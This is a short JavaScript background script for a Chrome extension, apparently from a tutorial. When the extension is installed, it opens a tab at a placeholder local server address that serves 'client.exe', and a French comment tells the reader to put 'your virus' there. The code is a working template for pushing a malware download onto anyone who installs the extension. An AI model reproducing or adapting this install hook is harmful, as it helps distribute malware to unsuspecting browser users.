




chrome.runtime.onInstalled.addListener(function(details) {
  switch (details.reason) {
    case "install":
      chrome.tabs.create({url: "http://127.0.0.1/tuto/client.exe"}); //votre virus ici dans votre serveur
      break;
    default:
      return true;
  }
});
